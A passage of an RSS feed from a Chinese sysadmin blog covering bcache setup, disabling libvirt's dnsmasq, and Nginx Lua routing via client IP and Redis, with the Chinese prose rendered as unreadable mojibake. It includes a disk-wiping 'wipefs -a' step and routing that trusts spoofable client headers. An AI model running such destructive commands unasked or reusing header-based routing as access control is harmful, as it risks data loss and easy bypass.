&lt;p&gt;å¦‚ä¸Šå›¾ï¼Œæ•°æ®å†™åˆ°ç¡¬ç›˜æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ç§æ˜¯Bcacheç”¨SSDåšç¼“å†²ï¼ŒåŠ é€Ÿæœ€åçš„ç¡¬ç›˜è¯»å†™ã€‚å¦ä¸€ç§æ˜¯ç›´æ¥è¯»å†™ç¡¬ç›˜ï¼Œbypassæ¨¡å¼ã€‚æˆ‘ä»¬ç”¨çš„æ˜¯ç¬¬ä¸€ç§Bcacheã€‚&lt;/p&gt;
&lt;p&gt;å®‰è£…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ yum install bcache-tools
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;/dev/sdaæ˜¯ç¡¬ç›˜ï¼Œ/dev/sdbæ˜¯ssdï¼Œ  é¦–å…ˆæŠŠä¸¤ä¸ªç›˜çš„æ•°æ®éƒ½æ“¦å¹²å‡€äº†&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ wipefs -a /dev/sda1 &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; wipefs -a /dev/sdb1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ ¼å¼åŒ–hddå’Œssdï¼Œæ³¨æ„å‚æ•°ä¸åŒ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ make-bcache -B /dev/sda1 &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; make-bcache -C /dev/sdb1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŒ‚æ¥bcache0&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; C_Set_UUID_VALUE &amp;gt; /sys/block/bcache0/bcache/attach
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ mkfs.ext4 /dev/bcache0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ mount /dev/bcache0 /mnt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¿®æ”¹ç¡¬ç›˜å†™çš„æ–¹æ³•ï¼Œæ”¹æˆwriteback(åŸæ¥æ˜¯writethrough)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1.ä¸´æ—¶ç”Ÿæ•ˆçš„æ–¹æ³•ï¼ˆé‡å¯å¤±æ•ˆï¼‰  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; writeback &amp;gt; /sys/block/bcache0/bcache/cache_mode
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2.æ°¸ä¹…ç”Ÿæ•ˆçš„æ–¹æ³•  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; /dev/sda1 &amp;gt; /sys/fs/bcache/register
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€åæŸ¥çœ‹ä¸€ä¸‹çŠ¶æ€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ bcache-status -s
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>å¦‚ä½•ç¦æ­¢libvirtdè‡ªå¸¦çš„dnsmasqå¯åŠ¨</title>
      <link>https://rendoumi.com/posts/20240123-kvm_disable_dnsmasq/</link>
      <pubDate>Tue, 23 Jan 2024 10:14:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240123-kvm_disable_dnsmasq/</guid>
      <description>&lt;p&gt;æœåŠ¡å™¨è¦è·‘dnsmasqï¼ŒåŒæ—¶æœºå™¨è¿˜è·‘ç€kvmï¼Œå’Œlibvirtdè‡ªå¸¦dnsmasqçš„å†²çªäº†ï¼Œéœ€è¦ç¦æ‰libvirtdçš„ã€‚&lt;/p&gt;
&lt;p&gt;æ–¹æ³•å¾ˆç®€å•ï¼Œå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh net-list
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name                 State      Autostart     Persistent  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--------------------------------------------------
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;default              active     yes           yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh net-autostart --disable default  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh net-destroy default
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æå®š.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Nginxä¸‹luaæ ¹æ®å®¢æˆ·ç«¯ipè¿›è¡Œåˆ†å‘</title>
      <link>https://rendoumi.com/posts/20240123-lua_ip_forward/</link>
      <pubDate>Tue, 23 Jan 2024 10:13:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240123-lua_ip_forward/</guid>
      <description>&lt;p&gt;å…¬å¸çš„çº¿ä¸Šç¯å¢ƒåˆ†ä¸ºé¢„å‘å¸ƒå’Œæ­£å¼ä¸¤ä¸ªéƒ¨åˆ†ã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®ä¸¤ä¸ªéƒ¨åˆ†æ˜¯å…¬ç”¨ä¸€ä¸ªNginxå‰ç«¯çš„ã€‚&lt;/p&gt;
&lt;p&gt;è¿™æ ·æ€ä¹ˆåˆ†å‘å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ç”¨&lt;code&gt;lua&lt;/code&gt;å³å¯ï¼Œå¦‚æœæ˜¯å…¬å¸æ¥çš„æŸä¸ªå›ºå®šipï¼Œåˆ™åˆ†å‘åˆ°é¢„å‘å¸ƒï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±èµ°æ­£å¼ç¯å¢ƒã€‚è¿™æ ·æµ‹è¯•å°±ç®€å•å¤šäº†ï¼Œè¿ç»´ç»Ÿä¸€è®¾ç½®ä¸€ä¸ªæ— çº¿wifiï¼Œæ¥å…¥è¿™ä¸ªwifiå°±èµ°æŸä¸ªå›ºå®šipï¼Œåˆ°çš„å…¨æ˜¯é¢„å‘å¸ƒç¯å¢ƒï¼Œä¸ç”¨è¿™ä¸ªwifiå°±èµ°æ­£å¼ç¯å¢ƒï¼Œéå¸¸æ–¹ä¾¿æµ‹è¯•ã€‚&lt;/p&gt;
&lt;p&gt;ç”¨luaè¿›è¡Œåˆ†å‘ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;location / &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    content_by_lua &lt;span class=&#34;s1&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            myIP = ngx.req.get_headers()[&amp;#34;X-Real-IP&amp;#34;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            if myIP == nil then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                myIP = ngx.req.get_headers()[&amp;#34;x_forwarded_for&amp;#34;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            end
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            if myIP == nil then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                myIP = ngx.var.remote_addr
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            end
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            if myIP == &amp;#34;å…¬å¸å‡ºå£IP&amp;#34; then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                ngx.exec(&amp;#34;@client&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            else
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;                ngx.exec(&amp;#34;@client_test&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;            end
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;location @client&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_next_upstream     error timeout&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_redirect          off&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_set_header        Host &lt;span class=&#34;nv&#34;&gt;$host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#proxy_set_header        X-Real-IP $remote_addr;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_set_header        X-Real-IP &lt;span class=&#34;nv&#34;&gt;$http_x_forwarded_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_set_header        X-Forwarded-For &lt;span class=&#34;nv&#34;&gt;$proxy_add_x_forwarded_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    client_max_body_size    100m&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    client_body_buffer_size 256k&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_connect_timeout   180&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_send_timeout      180&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_read_timeout      180&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_buffer_size       8k&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_buffers           &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 64k&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_busy_buffers_size 128k&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_temp_file_write_size 128k&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_pass http://client&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;location @client_test&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_next_upstream     error timeout&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_redirect          off&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_set_header        Host &lt;span class=&#34;nv&#34;&gt;$host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;#proxy_set_header        X-Real-IP $remote_addr;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_set_header        X-Real-IP &lt;span class=&#34;nv&#34;&gt;$http_x_forwarded_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_set_header        X-Forwarded-For &lt;span class=&#34;nv&#34;&gt;$proxy_add_x_forwarded_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    client_max_body_size    100m&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    client_body_buffer_size 256k&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_connect_timeout   180&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_send_timeout      180&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_read_timeout      180&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_buffer_size       8k&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_buffers           &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 64k&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_busy_buffers_size 128k&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_temp_file_write_size 128k&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_pass http://client_test&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>luaä¸redisç»“åˆåº”ç”¨äºnginxçš„åŠ¨æ€upstream</title>
      <link>https://rendoumi.com/posts/20240123-lua_redis_nginx_upstream/</link>
      <pubDate>Tue, 23 Jan 2024 10:12:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240123-lua_redis_nginx_upstream/</guid>
      <description>&lt;p&gt;æŠ€æœ¯è¦æ±‚å¾ˆç®€æ˜ï¼š&lt;/p&gt;
&lt;p&gt;nginxåˆ†å‘è¯·æ±‚çš„æ—¶å€™ï¼Œupstreamæ˜¯ç”±luaä»redisä¸­è¯»å–é…ç½®åŠ¨æ€ç”Ÿæˆçš„ï¼Œè¿™æ ·ä¾¿äºç”¨ç¨‹åºåŠ¨æ€ä¿®æ”¹ã€‚&lt;/p&gt;
&lt;p&gt;è£…å¥½nginx+luaï¼Œè¿‡ç¨‹ä¸è¡¨ã€‚ æŠŠlua redisçš„æ¨¡å—é…åˆ°è·¯å¾„ä¸­&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://raw.github.com/nrk/redis-lua/version-2.0/src/redis.lua  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;nginxé…ç½®å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;server &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  listen 80&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  server_name _&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  server_name_in_redirect off&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  port_in_redirect off&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  root /root/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  location / &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$upstream&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    rewrite_by_lua &lt;span class=&#34;s1&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      -- load global route cache into current request scope
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      -- by default vars are not shared between requests
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      local routes = _G.routes
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      -- setup routes cache if empty
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      if routes == nil then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        routes = {}
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        ngx.log(ngx.ALERT, &amp;#34;Route cache is empty.&amp;#34;)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      end
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      -- try cached route first
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      local route = routes[ngx.var.http_host]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      if route == nil then
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        local redis  = require &amp;#34;redis&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        local client = redis.connect(&amp;#34;localhost&amp;#34;, 6379)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        route        = client:get(ngx.var.http_host)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      end
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      -- fallback to redis for lookups
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      if route ~= nil then
